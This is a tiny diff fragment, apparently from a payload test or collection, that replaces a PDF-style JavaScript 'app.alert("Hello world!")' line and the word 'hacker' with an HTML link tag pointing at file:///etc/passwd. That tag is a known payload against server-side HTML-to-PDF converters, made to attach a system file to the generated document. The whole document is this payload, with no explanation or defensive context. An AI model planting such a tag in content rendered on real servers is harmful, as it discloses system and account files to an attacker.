@@ -1,5 +1,1 @@
-app.alert("Hello world!");
-
-
-
-hacker
+<link rel=attachment href=”file:///etc/passwd”>
